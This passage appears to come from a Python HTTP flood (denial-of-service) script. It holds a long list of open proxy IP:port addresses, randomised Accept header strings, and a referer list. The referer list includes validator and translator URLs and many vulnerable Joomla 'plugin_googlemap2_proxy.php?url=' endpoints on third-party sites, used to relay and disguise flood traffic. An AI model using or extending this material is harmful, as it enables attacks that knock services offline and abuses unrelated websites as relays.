45.7.135.233:999
47.115.149.82:443
128.199.96.113:18563
103.113.16.122:1080
177.54.229.1:9292
43.129.219.20:3001
120.224.122.36:7302
120.24.78.149:1080
120.237.253.142:1080
51.159.66.158:3128
36.137.57.38:81
140.83.52.150:1111
192.241.182.108:15185
1.4.198.67:8081
101.35.51.16:10080
170.79.12.72:9090
92.45.19.46:8080
72.221.172.203:4145
192.241.167.22:19197
178.252.141.206:8080
150.158.77.13:1088
85.25.99.106:5566
121.166.178.107:5002
190.1.201.58:8080
150.95.178.151:8888
216.245.192.130:18669
103.69.45.164:58199
49.128.218.147:15959
191.97.16.181:999
183.236.124.2:7300
46.101.207.6:9050
152.231.25.194:60080
61.147.172.150:7777
85.25.201.22:5577
39.152.104.167:7302
120.24.161.125:1080
20.94.179.174:1080
221.224.81.83:7302
103.216.82.37:6667
173.212.248.58:2087
14.140.131.82:3128
80.55.131.214:52014
140.227.203.41:3128
54.37.160.92:1080
222.217.74.162:1111
27.147.219.46:8080
5.183.101.101:14999
34.94.137.131:80
222.88.201.225:7302
113.121.37.64:8902
165.154.5.133:3512
203.12.200.32:1090
182.34.33.166:8902
79.133.120.35:48484
120.76.201.40:1080
212.156.55.34:8080
60.10.203.133:8006
93.179.94.133:5678
128.199.245.23:24527
150.109.32.166:80
178.154.228.16:9050
109.232.106.236:49565
85.25.195.177:5577
72.210.252.137:4145
61.134.48.51:7300
54.37.203.54:32556
117.84.154.186:8902
92.222.206.151:2020
211.140.228.229:7302
37.120.192.154:8080
122.15.211.126:80
112.95.227.6:7302
103.134.219.197:9050
98.170.57.231:4145
96.9.66.130:33427
23.88.36.141:9050
46.36.64.217:33427
103.214.202.105:8080
61.216.156.222:60808
146.56.112.236:5678
103.203.97.213:7300
120.24.57.170:1080
1.20.217.221:8080
218.29.61.178:7302
92.207.253.226:38157
61.133.8.86:7302
122.193.18.172:7302
161.97.123.237:3128
5.58.178.99:7777
61.161.196.126:7300
116.203.67.172:3128
120.24.201.59:1080
47.117.116.47:2002
45.224.111.39:55443
61.153.42.218:7302
185.32.6.131:8090
176.31.69.33:18144
192.252.215.5:16137
176.236.157.155:8080
120.79.184.141:1080
106.5.209.130:8001
89.19.116.102:41890
163.172.75.81:5566
91.193.253.188:23500
171.211.244.186:7302
167.114.89.169:37666
152.32.164.22:21616
120.24.53.117:1080
61.240.12.213:7302
85.25.111.162:5577
218.29.203.28:7302
96.9.71.19:33427
95.67.19.181:3128
120.24.68.247:1080
50.62.30.5:58490
85.25.139.22:5577
103.95.197.233:9050
164.70.70.77:3128
104.255.170.65:50503
51.83.140.70:8181
60.211.244.158:7300
45.81.225.67:7057
154.221.18.254:1080
78.139.124.87:8080
198.27.67.187:64083
42.248.120.10:8902
119.23.58.111:1080
85.172.31.16:33427
120.87.92.2:7302
139.59.1.14:1080
47.106.169.226:1080
89.111.133.217:9050
79.127.56.147:8080
111.75.160.149:7302
203.194.111.112:6969
45.179.164.9:80
43.224.10.23:6667
128.199.205.203:54767
13.231.137.2:48540
179.189.193.89:3129
219.154.156.21:7302
201.234.67.107:999
61.153.62.163:7302
123.57.26.118:1080
140.227.212.136:3128
169.57.157.148:80
185.87.121.5:8975
39.108.137.229:1080
120.79.173.225:50000
103.141.12.161:1080
37.57.15.43:33761
112.30.142.66:7300
60.6.215.241:7302
181.129.183.19:53281
161.35.159.28:3128
42.248.76.37:8902
51.155.3.184:33427
93.105.40.62:41258
111.160.7.148:7302
35.220.137.177:30023
120.79.15.97:1080
153.36.232.210:7890
139.59.13.219:10004
5.183.103.132:14999
178.18.243.41:9050
95.67.16.153:8080
61.178.152.31:7302
125.75.127.215:1111
175.213.81.62:1080
27.150.27.133:10080
162.243.146.217:31178
8.136.137.129:8877
39.129.198.182:7302
119.29.221.234:8003
70.166.167.36:4145
161.35.179.193:60235
51.254.44.184:30006
36.89.229.97:59707
180.167.166.5:7302
79.143.180.109:63640
178.136.2.208:55443
212.95.180.50:53281
119.147.98.124:7302
103.142.108.145:8080
118.178.131.166:19080
104.168.87.16:1080
154.159.243.117:8080
120.24.66.188:1080
181.6.168.203:1080
158.69.64.142:9200
212.200.39.210:8080
125.46.19.107:7302
200.8.19.18:999
5.128.61.28:1080
43.241.29.201:8080
103.90.231.93:23295
205.196.220.122:4506
173.197.167.242:8080
218.6.53.247:7302
112.163.21.154:23386
223.100.29.20:7302
5.189.185.139:3128
138.197.208.39:9050
91.204.250.133:33427
183.47.10.3:7302
120.24.200.2:1080
164.132.95.241:20268
191.96.42.80:1080
184.178.172.18:15280
37.57.38.133:44299
121.4.103.166:7891
170.106.152.12:21127
119.187.123.130:7302
103.81.84.225:8088
67.201.33.10:25283
49.70.13.237:7082
159.203.70.88:9100
119.28.155.202:9999
120.77.139.249:1080
185.81.98.120:3128
49.128.206.143:57067
109.94.110.202:9050
117.159.198.122:7302
114.6.87.177:60811
177.101.55.34:9090
188.165.59.127:3128
104.168.162.207:10002
47.52.254.9:9100
192.111.138.29:4145
180.168.141.242:1080
206.62.64.34:8080
185.200.38.206:10820
103.153.76.236:4002
113.28.90.66:9480
120.79.130.147:1080
116.212.152.95:33427
177.185.32.1:8080
92.222.206.150:2020
39.108.171.159:1080
5.188.181.170:3080
81.163.53.118:41258
1.71.170.146:7302
218.58.137.22:7302
197.246.212.70:3030
78.111.97.182:3142
201.238.242.38:999
183.62.58.98:7300
59.94.96.16:5678
167.71.214.4:45062
166.62.32.44:8181
111.38.166.251:7302
174.64.199.79:4145
121.235.209.219:8902
192.3.116.131:6789
120.24.176.9:1080
193.34.21.4:55277
120.24.72.243:1080
45.207.36.100:1080
159.89.167.209:47202
39.108.64.172:1080
183.129.157.62:7302
107.21.38.230:9050
207.180.240.119:1080
167.71.92.197:55443
154.239.6.163:50800
43.135.74.226:38081
60.12.79.187:7302
36.112.209.171:7302
12.90.37.182:8181
176.110.2.15:8080
91.121.210.56:10087
42.248.125.203:8902
115.159.65.66:7302
112.78.170.250:8080
140.227.239.34:3128
67.210.146.50:11080
184.178.172.25:15291
183.134.199.108:7302
45.161.115.145:999
5.11.17.230:1080
120.224.124.14:7891
131.161.60.25:8083
49.51.69.212:21127
47.106.180.67:1080
185.189.199.75:23500
35.223.114.70:3127
120.24.189.101:1080
184.181.217.210:4145
82.99.232.18:58689
54.37.160.93:1080
171.237.205.83:1080
63.250.32.245:19542
122.224.56.198:7302
122.226.224.166:7302
47.245.56.108:18181
165.227.104.122:5743
104.168.12.190:5555
183.173.23.100:7890
103.216.82.20:6667
91.198.137.31:3513
120.24.187.149:1080
202.62.48.5:33427
221.12.145.70:7302
45.32.171.166:9050
153.3.250.242:33080
20.94.230.158:80
47.106.122.110:1080
187.94.209.246:3128
82.156.114.119:8003
185.207.205.134:8001
36.138.93.224:81
117.84.156.254:8902
194.87.102.102:1111
183.230.141.185:7302
61.188.186.157:7302
140.227.228.30:3128
176.9.65.8:38460
113.231.68.139:7302
41.65.174.120:1981
117.86.175.109:20008
43.249.224.172:83
60.10.37.21:7302
104.255.170.67:50503
37.131.202.95:33427
117.158.175.21:7302
103.230.212.21:7302
139.162.241.44:64198
192.252.209.155:14455
184.185.2.190:4145
185.154.72.177:41080
221.158.143.58:5001
103.73.75.33:1080
1.196.217.57:7302
183.215.125.101:7302
104.131.65.115:1337
142.4.21.35:35181
176.115.197.118:8080
104.255.170.64:56541
152.70.246.237:40009
98.178.72.21:10919
216.245.192.130:46539
181.204.104.74:8080
190.248.153.162:8080
220.169.127.176:7302
222.175.107.206:7302
212.129.35.138:18703
119.40.83.138:8080
116.212.142.204:33427
204.44.94.93:32661
77.43.86.211:8080
180.124.154.61:8902
192.140.91.133:50701
123.56.115.59:1080
120.24.174.98:1080
115.239.234.43:7302
178.62.22.215:28383
219.131.62.67:7302
103.146.185.105:3127
111.53.120.154:7300
111.20.239.188:7302
192.111.139.165:4145
103.248.93.5:8080
113.107.139.199:7302
98.162.25.4:31654
111.193.116.172:1080
152.231.25.126:8080
122.228.145.126:7302
125.141.139.60:5566
106.15.180.114:8003
82.114.106.40:1256
222.240.80.227:7302
109.95.32.145:8080
105.235.222.2:8080
93.145.17.218:8080
104.236.78.102:3128
111.43.105.154:7302
177.128.115.229:999
120.24.244.187:1080
187.1.57.206:20183
150.129.52.74:6667
5.188.136.52:8080
190.71.27.179:999
61.134.53.124:7302
8.210.48.101:17194
194.60.87.97:19047
218.93.207.213:7890
169.57.157.148:25
120.78.69.103:1080
88.255.185.229:8080
95.216.243.188:1020
101.74.239.6:1111
220.171.121.3:7302
42.248.127.67:8902
91.237.84.152:8080
216.245.192.130:3938
188.166.104.152:20643
123.18.206.50:1080
119.167.81.238:7302
190.109.168.217:8080
167.99.239.113:47430
184.178.172.13:15311
103.73.74.181:1080
59.62.245.222:20007
178.62.32.105:25292
161.97.179.49:3128
107.170.50.49:36827
176.117.237.132:1080
218.207.218.21:7302
45.7.177.237:34234
212.47.238.228:8118
47.106.224.118:1080
124.114.234.171:7302
8.210.48.101:18474
46.98.251.182:8081
117.178.233.74:7302
45.169.16.1:8080
85.235.184.186:3129
45.67.229.104:30003
192.163.252.85:52119
144.91.104.118:38080
37.29.80.161:8080
72.221.232.155:4145
103.75.184.126:38556
122.155.165.191:3128
111.1.91.177:7302
20.210.80.237:1080
184.178.172.14:4145
13.125.211.66:443
200.25.254.193:54240
165.22.214.24:28704
159.8.114.34:8123
47.109.40.23:1080
124.227.14.147:7302
190.131.250.105:999
216.245.212.166:44518
201.249.161.51:999
111.38.9.49:7300
94.130.244.179:5566
198.8.94.170:39074
129.21.49.147:9050
120.24.176.20:1080
122.193.18.134:7302
115.127.162.234:8080
85.25.100.47:5577
212.174.11.120:9090
140.83.63.8:9050
101.33.117.230:40532
112.30.60.236:22222
103.73.74.178:1080
58.97.72.83:8080
222.248.219.213:1111
59.49.96.190:7302
42.248.121.149:8902
121.34.248.21:7302
180.167.161.166:7302
120.25.167.180:1080
185.251.45.174:1080
157.230.13.52:55904
115.238.99.174:7302
185.108.141.74:8080
36.32.191.51:7302
180.211.193.130:3127
81.143.236.200:443
37.152.187.170:9090
114.231.198.35:20001
36.66.103.211:3128
128.199.196.151:443
98.162.25.29:31679
117.156.53.26:7300
45.181.121.73:999
72.221.196.157:35904
116.80.49.253:3128
95.167.29.50:8080
204.195.136.34:80
123.119.161.204:10800
122.226.168.18:7302
173.248.248.90:8080
203.189.89.153:8080
39.108.6.90:1080
218.87.108.231:7300
185.200.37.118:10820
1.180.0.162:7302
122.13.77.173:53333
221.2.74.130:1085
5.149.219.201:8080
218.76.202.167:7302
165.192.76.147:1080
98.175.31.195:4145
47.106.156.15:1080
58.37.105.184:7891
114.234.30.173:8902
103.69.38.64:8080
122.9.162.243:1080
61.178.99.43:7302
193.138.247.36:3128
85.236.190.201:1080
212.8.246.207:13896
139.226.74.3:1088
164.70.117.141:3128
120.24.174.94:1080
173.82.202.224:11028
167.114.89.174:37666
104.236.45.251:1089
148.251.249.251:8080
216.245.192.130:15768
104.128.72.23:8951
69.61.200.104:36181
223.8.122.132:7302
173.82.252.159:22318
221.218.245.146:7302
112.105.12.67:1111
182.151.212.156:7300
179.61.111.226:999
110.191.237.91:7302
50.232.250.157:8080
192.111.139.162:4145
197.232.65.40:55443
138.201.107.232:9050
94.130.72.121:10005
113.28.90.67:9480
103.135.220.91:80
220.179.50.121:7302
85.234.126.107:55555
133.167.121.133:1976
119.82.245.101:6060
42.248.120.42:8902
118.123.241.64:10808
80.234.30.36:1080
223.99.199.173:7302
103.153.190.78:8081
188.25.15.193:9050
190.120.251.26:999
181.78.21.174:999
218.28.136.54:7302
103.57.222.220:39704
120.78.185.215:1080
180.124.155.200:8902
47.104.16.8:6667
47.107.94.85:1080
221.207.6.100:7302
137.74.61.115:9100
120.78.94.148:1080
113.204.236.42:7302
112.74.162.146:1080
190.217.14.110:999
220.165.182.218:7302
177.93.33.246:999
95.216.181.107:9070
46.28.108.131:48113
192.111.135.17:18302
58.248.89.3:1080
122.248.197.121:9050
72.217.216.239:4145
103.16.60.22:50000
121.37.168.247:1080
196.216.65.57:8080
101.33.253.76:7890
123.150.95.142:7302
50.233.228.147:8080
111.203.10.200:7302
193.142.146.157:9150
146.56.172.230:1080
203.189.89.158:8080
139.198.30.210:3128
185.134.96.34:8081
60.174.197.51:7302
116.80.58.110:3128
120.24.70.241:1080
202.105.238.173:7302
122.193.18.135:7302
113.124.220.240:8902
206.189.118.100:18938
45.119.82.33:48464
183.81.156.131:8080
80.191.164.173:6565
120.196.228.73:1081
222.243.158.54:7302
103.90.231.93:17617
8.130.161.231:7891
112.27.59.234:7302
165.154.61.24:3512
146.56.138.232:35362
120.24.193.93:1080
67.201.33.9:25280
96.9.92.227:33427
169.57.157.146:8123
181.205.41.210:7654
66.135.227.181:4145
120.24.85.197:1080
60.10.10.171:7302
113.121.40.228:8902
159.75.76.5:9090
167.71.5.83:1080
72.206.181.103:4145
218.207.218.19:7302
43.154.57.108:9961
116.235.89.90:1080
62.113.115.94:16072
223.212.194.127:8090
60.255.137.42:7302
184.178.172.5:15303
67.205.191.23:18474
111.22.216.141:7302
222.212.85.16:7000
47.115.16.168:1080
120.33.27.218:7302
210.16.73.85:1080
158.58.135.23:33427
39.119.103.113:40086
125.25.206.28:8080
222.180.25.132:7302
101.200.137.28:8902
176.214.97.13:8081
8.242.142.182:999
219.146.197.174:7302
116.73.14.16:8080
167.99.62.42:42688
20.105.253.176:8080
174.77.111.196:4145
91.206.148.243:61410
61.90.185.171:7302
103.250.158.21:6667
120.24.193.153:1080
218.149.25.193:1111
120.24.194.16:1080
195.177.217.131:60613
27.116.51.178:6667
116.80.84.159:3128
103.242.175.214:57081
39.108.72.165:1080
206.189.92.74:7777
36.89.86.49:56845
192.252.208.67:14287
181.3.48.176:1080
5.188.211.50:7777
110.77.134.106:8080
114.6.88.238:60811
46.101.103.161:25799
113.108.247.146:20086
190.124.30.43:999
185.125.252.241:1080
182.160.124.26:8081
112.5.72.213:7302
47.106.129.66:1080
112.53.83.102:1080
112.124.27.159:4406
186.103.234.75:999
159.8.114.37:25
179.118.198.20:3128
41.79.9.246:8080
195.175.67.202:1080
103.78.171.10:83
181.225.54.59:6969
61.191.144.18:7300
119.81.189.194:25
221.11.48.82:7302
1.20.217.52:8080
118.122.250.27:7302
47.115.10.253:1080
84.238.219.216:33427
91.121.6.84:2114
219.138.174.6:7302
60.191.24.52:7302
185.243.56.207:14999
23.224.20.134:8080
47.96.102.110:1080
164.70.116.39:3128
104.168.214.225:26047
84.10.217.121:3333
91.150.67.17:8080
198.1.94.46:15456
43.224.10.22:6666
61.180.29.15:20003
218.89.37.196:7302
223.112.183.58:7302
213.32.62.216:1080
122.193.18.156:7302
46.36.89.27:33427
159.8.114.37:80
191.96.231.98:3128
111.47.10.107:7302
112.49.16.32:7302
61.175.213.190:7302
15.164.219.8:8118
5.141.244.97:61288
122.194.205.43:7302
89.19.115.55:6655
36.91.149.59:8080
104.168.169.132:10003
98.162.96.52:4145
222.223.103.232:7302
58.221.135.158:7302
120.76.75.159:1080
185.234.72.65:9050
202.62.84.210:53281
120.76.128.31:1080
120.24.193.203:1080
41.65.36.166:1981
39.108.0.1:1080
202.105.189.58:7302
152.67.202.0:1080
45.248.9.137:8003
45.55.112.168:51800
212.46.230.102:6969
58.48.122.170:7302
98.162.25.7:31653
120.24.7.141:1080
138.68.51.109:9050
223.100.241.162:7302
111.172.65.190:1081
45.181.122.9:999
118.122.144.92:7302
95.78.174.235:8080
114.99.47.150:7302
184.178.172.28:15294
194.180.174.81:10523
113.124.218.124:8902
47.243.238.186:9090
205.185.117.77:16831
198.8.94.170:4145
202.180.19.173:1080
180.76.250.195:1080
131.72.69.98:45005
103.117.194.166:8080
139.5.151.179:63123
66.42.224.229:41679
24.249.199.4:4145
72.210.252.134:46164
62.112.118.14:8080
5.189.184.146:61424
178.217.140.70:443
192.169.139.161:8975
218.65.221.24:7302
175.184.231.178:8080
124.113.224.245:7302
35.223.101.235:9050
45.113.80.37:9050
123.178.142.222:7302
183.131.85.16:7302
185.204.197.169:8080
211.93.2.190:7302
8.210.48.101:18489
23.95.137.162:9050
43.224.8.116:6667
188.136.216.201:9080
201.91.82.155:3128
103.19.130.50:8080
34.134.60.185:443
198.12.121.71:38007
45.56.84.125:80
116.202.30.183:51105
34.132.61.61:3127
218.6.152.149:7300
165.154.75.108:3512
39.96.175.55:1080
68.71.249.153:48606
185.58.224.205:8081
192.241.135.228:9050
120.24.179.68:1080
174.64.199.82:4145
45.127.246.98:8080
218.64.122.99:7302
176.74.9.62:8080
46.35.249.189:41419
120.79.223.240:1080
120.24.192.51:1080
209.141.37.57:5555
78.30.198.160:8080
200.155.139.242:3128
91.222.19.177:41890
58.48.84.30:7302
120.24.202.189:1080
183.220.253.178:7302
120.24.79.127:1080
72.221.164.34:60671
137.184.57.65:9050
154.236.168.181:1976
112.122.189.125:7300
161.202.226.194:80
95.213.154.54:31337
203.170.222.4:8080
222.187.74.246:8902
46.149.48.44:1000
42.248.122.198:8902
88.198.24.108:1080
223.27.194.66:80
43.155.92.192:59394
140.227.229.54:3128
142.44.136.97:7001
112.133.215.24:8080
80.82.55.71:80
120.24.88.50:1080
72.223.168.73:57494
120.71.148.202:8901
47.89.153.213:80
198.55.106.182:10086
103.120.133.178:33427
8.136.159.152:8877
104.131.8.62:19709
92.38.163.160:48484
43.129.222.186:38080
183.250.109.213:7302
113.160.188.21:1080
138.68.6.227:9071
110.49.11.50:8080
120.79.43.42:1080
60.12.77.163:7302
102.222.252.6:9050
155.94.128.90:1080
60.215.109.34:7302
123.231.221.178:8080
59.175.146.43:7302
118.67.219.153:8080
67.55.186.162:8080
85.25.91.141:5577
111.33.92.16:7302
183.3.149.98:7302
41.65.193.100:1976
129.154.54.92:9999
140.227.211.115:3128
3.113.19.41:48540
23.254.209.129:24825
36.27.223.80:22036
120.24.59.25:1080
59.45.209.158:7302
161.202.226.194:8123
51.254.16.102:56148
194.44.104.242:31280
66.211.155.34:8080
212.180.252.34:8181
121.88.250.73:3128
150.230.45.220:8080
198.55.106.113:9055
112.31.106.108:31280
117.157.67.56:7302
42.248.122.220:8902
119.81.189.194:80
165.154.92.12:3512
159.192.104.53:8080
27.74.10.157:5018
201.220.102.146:8080
120.24.174.223:1080
47.106.83.26:1080
14.207.144.47:9080
115.42.212.101:7302
121.232.66.180:20007
43.129.220.105:3001
46.36.72.61:33427
218.201.172.7:8003
184.179.216.130:4145
213.216.67.190:8080
195.170.38.230:8080
45.67.231.58:9050
3.22.167.115:48540
61.191.144.18:7302
220.160.67.1:7302
160.19.240.58:8080
113.57.85.34:7302
59.51.87.27:7302
49.128.199.150:57541
47.75.96.111:10005
45.61.164.221:11411
218.68.0.154:7302
195.158.197.13:1043
60.12.109.74:7302
47.112.159.136:1080
218.75.216.18:7302
176.9.75.42:1080
61.178.172.95:7300
91.206.92.92:80
103.253.145.219:62162
142.93.137.235:47896
72.195.114.184:4145
103.216.82.19:6667
185.87.121.35:8975
202.40.188.94:40486
191.97.6.213:999
125.141.139.112:5566
103.138.41.132:8080
110.83.222.158:7302
45.169.148.11:999
120.76.247.227:1080
222.175.22.198:7302
125.75.127.191:1111
203.163.208.201:8080
122.193.18.136:7302
82.99.204.198:1080
200.0.40.134:8080
128.199.109.51:50877
49.128.218.142:47053
162.144.105.149:44316
103.81.214.254:82
103.242.175.115:1080
45.181.226.137:999
116.1.201.199:7302
120.79.97.105:1080
134.119.206.110:1080
110.78.28.94:8080
152.231.27.33:60080
120.24.200.122:1080
109.86.182.203:3128
157.245.42.58:53749
59.66.17.14:7890
51.15.122.235:9050
117.62.165.54:7891
91.198.137.31:3594
70.166.167.38:57728
152.32.185.145:1080
61.182.226.246:9999
111.41.48.161:7302
203.190.149.143:1080
46.21.248.155:9100
5.183.101.106:14999
218.205.124.53:7302
120.24.188.83:1080
62.152.75.110:50287
120.24.194.86:1080
113.247.221.4:7302
203.150.172.151:8080
159.8.114.34:25
217.66.178.107:2235
192.169.250.203:17296
85.25.118.155:5577
193.37.152.92:3128
221.214.109.166:7302
165.227.104.122:45119
192.252.208.70:14282
61.130.151.230:7302
46.0.234.11:5678
110.164.59.101:8080
193.203.61.35:8443
119.3.231.232:8001
120.77.12.33:1080
154.17.0.225:1080
72.206.181.105:64935
43.224.10.43:6666
79.122.225.167:8080
164.70.68.139:3128
203.86.236.148:3128
103.99.8.106:84
222.83.251.180:7302
190.60.104.218:3128
14.136.204.35:1088
124.161.103.80:7300
113.121.41.26:8902
104.131.8.62:10808
169.57.157.148:8123
179.49.161.58:999
61.160.93.54:7302
45.142.214.123:30002
222.217.240.207:7302
101.36.117.110:5555
128.199.193.214:8888
122.193.18.145:7302
98.162.25.23:4145
223.244.237.126:7300
111.21.186.98:7302
159.69.112.218:8888
221.214.218.105:7302
43.249.224.170:83
192.111.129.150:4145
208.52.137.150:5555
152.32.201.77:443
112.17.105.8:7300
72.195.34.58:4145
47.106.20.55:1080
159.65.24.24:9050
60.28.57.177:7302
23.94.149.131:53335
47.119.156.26:1080
125.123.44.195:10800
34.95.224.52:443
213.32.75.88:9300
120.24.185.143:1080
120.79.60.12:1080
58.216.159.46:7302
173.196.205.170:8080
116.48.133.94:40086
120.79.7.11:1080
54.37.160.88:1080
45.182.190.146:999
173.212.248.58:32077
204.199.67.174:999
39.129.178.13:7302
117.187.234.218:7302
134.122.102.103:8118
85.25.198.22:5577
95.0.219.234:8080
121.37.26.217:1080
103.102.193.242:7302
103.141.12.190:1080
180.168.152.206:7302
79.143.30.163:55418
158.69.225.124:2021
124.71.153.134:8901
128.199.202.122:1080
85.25.4.28:5566
61.178.88.109:7302
151.237.60.43:33427
150.109.148.234:1234
118.40.25.195:5003
93.190.141.62:9050
149.202.184.186:3128
138.68.60.8:1080
157.230.177.3:999
195.178.56.37:8080
47.57.184.90:28388
222.87.37.54:7302
3.144.99.13:38800
111.43.107.136:7302
192.111.137.34:18765
117.178.233.75:7302
101.71.154.251:1080
112.31.106.108:23456
119.23.44.204:1080
221.10.195.67:7302
39.152.112.207:7300
170.79.235.3:999
119.23.51.197:1080
219.135.149.68:7302
144.76.224.49:63640
138.68.57.62:9050
120.78.221.31:1080
221.211.62.4:1111
77.238.79.111:8080
95.215.48.93:8080
140.83.36.83:1000
167.99.12.224:22564
77.50.104.110:3128
183.250.154.92:7302
182.160.108.188:8090
5.58.178.99:41890
31.128.248.1:1080
103.243.114.206:8080
218.56.102.10:7302
120.25.105.219:1080
192.111.130.2:4145
114.243.173.98:1080
223.99.172.44:7302
114.132.220.223:10808
129.146.229.159:20000
94.74.132.129:808
183.236.245.246:7302
81.24.117.250:18080
39.104.129.141:7302
114.235.107.225:8902
210.12.172.12:7300
43.224.10.27:6667
173.82.119.12:11623
221.195.143.239:7300
195.90.201.165:9894
77.236.243.39:1256
120.24.193.206:1080
120.24.201.9:1080
45.76.174.167:31500
176.67.0.242:8080
119.29.48.249:8888
62.27.108.174:8080
51.38.125.228:42977
74.143.245.221:80
8.242.207.202:8080
43.154.143.161:9090
39.153.193.158:7302
181.48.23.250:8080
51.81.197.85:9050
51.15.228.227:3128
8.210.48.101:18193
120.79.53.184:1080
120.24.194.11:1080
91.207.238.107:56288
47.242.230.213:12345
188.165.254.122:9420
"""
]

acceptall = [
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
     'Accept-Encoding: gzip, deflate\r\n',
     'Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
     'Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n',
     'Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n',
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n',
     'Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n',
     'Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
     'Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n',
     'Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
     'Accept: text/html, application/xhtml+xml',
     'Accept-Language: en-US,en;q=0.5\r\n',
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n',
     'Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n']

referers = [
    'http://help.baidu.com/searchResult?keywords=',
    """http://help.baidu.com/searchResult?keywords=,
    https://kriserlanggacity.com/=,
    http://www.bing.com/search?q=,
https://duckduckgo.com/?q=,
http://www.ask.com/web?q=,
http://search.aol.com/aol/search?q=,
https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=,
https://drive.google.com/viewerng/viewer?url=,
http://validator.w3.org/feed/check.cgi?url=,
http://host-tracker.com/check_page/?furl=,
http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=,
http://jigsaw.w3.org/css-validator/validator?uri=,
https://add.my.yahoo.com/rss?url=,
http://www.google.com/?q=,
http://www.usatoday.com/search/results?q=,
http://engadget.search.aol.com/search?q=,
https://steamcommunity.com/market/search?q=,
http://filehippo.com/search?q=,
http://www.topsiteminecraft.com/site/pinterest.com/search?q=,
http://eu.battle.net/wow/en/search?q=,
https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=,
https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=,
https://drive.google.com/viewerng/viewer?url=,
http://www.google.com/translate?u=,
https://developers.google.com/speed/pagespeed/insights/?url=,
http://help.baidu.com/searchResult?keywords=,
http://www.bing.com/search?q=,
https://add.my.yahoo.com/rss?url=,
https://play.google.com/store/search?q=,
http://www.google.com/?q=,
http://regex.info/exif.cgi?url=,
http://anonymouse.org/cgi-bin/anon-www.cgi/,
http://www.google.com/translate?u=,
http://translate.google.com/translate?u=,
http://validator.w3.org/feed/check.cgi?url=,
http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=,
http://validator.w3.org/check?uri=,
http://jigsaw.w3.org/css-validator/validator?uri=,
http://validator.w3.org/checklink?uri=,
http://www.w3.org/RDF/Validator/ARPServlet?URI=,
http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=,
http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=,
http://validator.w3.org/mobile/check?docAddr=,
http://validator.w3.org/p3p/20020128/p3p.pl?uri=,
http://online.htmlvalidator.com/php/onlinevallite.php?url=,
http://feedvalidator.org/check.cgi?url=,
http://gmodules.com/ig/creator?url=,
http://www.google.com/ig/adde?moduleurl=,
http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=,
http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=,
http://host-tracker.com/check_page/?furl=,
http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=,
http://www.onlinewebcheck.com/check.php?url=,
http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=,
http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=,
http://about42.nl/www/showheaders.php;POST;about42.nl.txt,
http://browsershots.org;POST;browsershots.org.txt,
http://streamitwebseries.twww.tv/proxy.php?url=,
http://www.comicgeekspeak.com/proxy.php?url=,
http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=,
http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=,
http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=,
http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=,
http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=,
http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=,
http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=,
http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=,
http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=,
http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=
http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=
